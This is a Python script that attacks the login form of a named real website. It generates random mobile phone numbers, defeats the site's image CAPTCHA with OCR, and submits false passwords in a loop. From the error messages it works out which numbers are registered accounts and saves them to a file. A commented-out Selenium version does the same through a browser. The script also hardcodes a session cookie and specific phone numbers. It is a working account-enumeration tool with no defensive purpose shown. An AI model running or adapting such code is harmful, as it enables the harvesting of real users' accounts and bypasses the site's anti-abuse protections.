import json
import random
import time
import traceback

import ddddocr
import requests

from utils.output_utils import print_inf, print_suc


#
# opt = Options()
# # opt.add_argument('--headless')
# cdriver = webdriver.Chrome('chromedriver/chromedriver.exe', options=opt)  # win c driver
# cdriver.implicitly_wait(1)  # wait
# print_inf('selenium启动成功')
# cdriver.get('https://www.yxcps.com/')
# login_btn_xpath = '//*[@id="top_nav_box"]/li[4]/a'
# tel_xpath = '//*[@id="popDiv"]/div[1]/div/div[2]/div[2]/div/ul/li[2]/a'
# verify_code_img_xpath = '//*[@id="imageVCodeId"]'
# verify_code_input_xpath = '//*[@id="imageVCode"]'
# ad_1_xpath = '/html/body/div[7]/div/a'
# ad_2_xpath = '//*[@id="tancsrc"]/div[1]/div/a[1]'
#
# cdriver.find_element(By.XPATH, ad_1_xpath).click()
# cdriver.find_element(By.XPATH, ad_2_xpath).click()
# print_inf('关闭广告成功')
#
# cdriver.find_element(By.XPATH, login_btn_xpath).click()  # 点击登录按钮
# cdriver.find_element(By.XPATH, tel_xpath).click()  # 点击手机密码登录按钮
#
# tel_input_xpath = '//*[@id="accountNo"]'
# pwd_input_xpath = '//*[@id="pswd"]'
# info_bar_xpath = '//*[@id="fastAjaxLoginForm"]/div/div/div[1]/span'
# submit_btn_xpath = '//*[@id="fastAjaxLoginForm"]/div/div/div[6]/a'


def input_element(xpath, string):
    # cdriver.implicitly_wait()
    r = cdriver.find_element(By.XPATH, xpath)
    # r.click()
    # r.clear()
    while string not in r.text:
        print('1')
        try:
            if r.is_enabled() and r.is_selected():
                r.click()
                r.send_keys(string)
                # break
        except Exception:
            traceback.print_exc()


def generate_random_str(randomlength=8):
    """
    生成一个指定长度的随机字符串
    """
    random_str = ''
    base_str = '0123456789'
    length = len(base_str) - 1
    for i in range(randomlength):
        random_str += base_str[random.randint(0, length)]

    return random_str


#
# while True:
#     random_tel = '139' + generate_random_str()
#     tel_input = cdriver.find_element(By.XPATH, tel_input_xpath)
#     pwd_input = cdriver.find_element(By.XPATH, pwd_input_xpath)
#     submit_btn = cdriver.find_element(By.XPATH, submit_btn_xpath)
#     info_bar = cdriver.find_element(By.XPATH, info_bar_xpath)
#     try:
#         verify_code_input = cdriver.find_element(By.XPATH, verify_code_input_xpath)
#         verify_code = cdriver.find_element(By.XPATH, verify_code_img_xpath).screenshot_as_png
#         ocr = ddddocr.DdddOcr()
#         ocr_res = ocr.classification(verify_code)  # 识别验证码
#         input_element(pwd_input_xpath, 'alsdkjfs13')  # 输入一定不正确的密码(大概率)
#         input_element(tel_input_xpath, random_tel)  # 输入随机的电话号码
#         input_element(verify_code_input_xpath, ocr_res)  # 输入验证码
#         print_inf('%s:%s:%s' % (random_tel, ocr_res, info_bar.text))  # text验证
#         submit_btn.click()
#
#     except Exception:
#         print_err('没找到验证码输入框')
#         # traceback.print_exc()
#         # time.sleep(5)
#         # cdriver.implicitly_wait(100)
#         input_element(tel_input_xpath,'13940273817')# 弄出验证码框
#         input_element(pwd_input_xpath,'asldlfhawe')
#         submit_btn.click()
JSESSIONID = '7F2A5FB27919F4FA49B71CA69B2F1903'

cookie = {'JSESSIONID': JSESSIONID}


def getcsrftoken():
    """
POST /csrfToken HTTP/1.1
Host: www.yxcps.com
Cookie: JSESSIONID=7F2A5FB27919F4FA49B71CA69B2F1903;
Content-Length: 11

suggest=txt
    :return:
    """
    data = {'suggest': 'txt'
            }
    res = requests.post('http://www.yxcps.com/csrfToken', cookies=cookie, data=data)
    requ = json.loads(res.text)['result']
    setcook = res.headers['Set-Cookie']
    if len(setcook) > 0:
        for it in setcook.split(';'):
            res_s = it.split('=')
            if len(res_s) > 1:
                cookie[res_s[0]] = res_s[1]
    return requ


d = ddddocr.DdddOcr()  # 开启验证码识别模块


def get_verify_code():
    url = 'https://www.yxcps.com/vcode2/imageVCode?t=%s' % int(time.time())
    res = requests.get(url, cookies=cookie)
    n = d.classification(res.content)
    return n


def send_verify_package(phone: str):
    headers_add = getcsrftoken()
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Ctoken': '',
        'X-Requested-With': 'XMLHttpRequest',
        'Csrftoken': headers_add,
        'Accept': '*/*',
        'Connection': 'close'
    }
    data = {
        'agree': 1,
        'autoLoginFlag': 1,
        'checkImageVCode': 1,
        'accountNo': phone,
        'imageVCode': get_verify_code(),
        'pswd': 'ls82hhd92j',
        'checkbox': 'checkbox',
    }
    r = requests.post('http://www.yxcps.com/account/axlogin2.do', headers=headers, cookies=cookie, data=data).text
    return r


threads = 0


def doonce(tel):
    global threads
    threads += 1
    global cookie
    random_tel = tel
    w = open('tel.res', 'a')
    while True:
        msg = json.loads(send_verify_package(random_tel))['msg']
        cookie = {'JSESSIONID': JSESSIONID}
        # print(msg)
        if '用户名或密码错误' in msg:
            print_suc(random_tel)
            w.write(random_tel + '\n')
            break
        elif '未注册' in msg:
            print_inf(random_tel)
            break
    threads -= 1


if __name__ == '__main__':
    doonce('13944064724')
    while True:
        try:
            doonce('13' + generate_random_str(9))
        except:
            pass
